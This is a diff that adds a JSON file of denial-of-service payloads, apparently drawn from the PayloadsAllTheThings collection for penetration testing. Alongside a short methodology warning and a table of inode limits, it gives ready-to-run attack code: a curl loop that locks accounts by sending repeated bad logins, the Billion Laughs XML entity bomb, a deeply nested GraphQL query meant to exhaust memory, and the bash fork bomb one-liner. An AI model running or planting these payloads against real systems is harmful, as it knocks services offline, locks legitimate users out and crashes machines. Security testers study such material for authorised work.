@@ -1,0 +1,76 @@
+{
+  "category": "Denial of Service",
+  "source": "PayloadsAllTheThings/Denial of Service/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What DoS / DDoS is and why to be careful",
+      "language": "text",
+      "tags": ["dos", "methodology"],
+      "body": "DoS means making a service unavailable (a flood of requests or exploiting a bug -> crash/degradation). DDoS is the same from multiple sources.\n[!] Test DoS extremely carefully: it is often OUT-OF-SCOPE, can genuinely take down production and may cost you access. Check the program rules first."
+    },
+    {
+      "subcategory": "Account lockout",
+      "title": "Account lockout DoS",
+      "language": "bash",
+      "tags": ["dos", "account-lockout"],
+      "body": "for i in {1..100}; do curl -X POST -d \"username=user&password=wrong\" <target_login_url>; done"
+    },
+    {
+      "subcategory": "Filesystem limits",
+      "title": "Inode exhaustion (No space left on device)",
+      "language": "text",
+      "tags": ["dos", "filesystem", "inodes"],
+      "body": "Make the application write files until you hit the filesystem inode limit -> \"No space left on device\". An alternative is to inflate a single file (SQLite DB, log) up to the maximum filesystem size.\nFAT32 is limited to 4 GB per file (which is why it gets replaced with exFAT/NTFS)."
+    },
+    {
+      "subcategory": "Filesystem limits",
+      "title": "Maximum inodes by filesystem",
+      "language": "table",
+      "tags": ["dos", "filesystem"],
+      "body": "btrfs ext4 fat32 ntfs xfs zfs inodes",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Filesystem", "Maximum inodes / files"],
+          "rows": [
+            ["BTRFS", "2^64 (~18 quintillion)"],
+            ["EXT4", "~4 billion"],
+            ["FAT32", "~268 million files"],
+            ["NTFS", "~4.2 billion (MFT records)"],
+            ["XFS", "Dynamic (disk size)"],
+            ["ZFS", "~281 trillion"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Memory exhaustion",
+      "title": "Billion Laughs (XML bomb)",
+      "language": "xml",
+      "tags": ["dos", "xxe", "xml-bomb"],
+      "body": "<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n<!ENTITY lol \"lol\">\n<!ELEMENT lolz (#PCDATA)>\n<!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n<!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n<!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n<!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n<!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n<!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n<!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n]>\n<lolz>&lol9;</lolz>"
+    },
+    {
+      "subcategory": "Memory exhaustion",
+      "title": "GraphQL - deeply nested queries",
+      "language": "text",
+      "tags": ["dos", "graphql"],
+      "body": "query { \n    repository(owner:\"rails\", name:\"rails\") {\n        assignableUsers (first: 100) {\n            nodes {\n                repositories (first: 100) {\n                    nodes {\n                        \n                    }\n                }\n            }\n        }\n    }\n}"
+    },
+    {
+      "subcategory": "Memory exhaustion",
+      "title": "Other exhaustion vectors",
+      "language": "text",
+      "tags": ["dos", "memory"],
+      "body": "- Image Resizing - corrupted images with tampered headers (abnormal size / huge pixel count).\n- SVG - an XML-based format -> try billion laughs.\n- Regular Expression - ReDoS.\n- Fork Bomb (see below)."
+    },
+    {
+      "subcategory": "Memory exhaustion",
+      "title": "Fork Bomb (Linux)",
+      "language": "bash",
+      "tags": ["dos", "fork-bomb"],
+      "body": ":(){ :|:& };:"
+    }
+  ]
+}
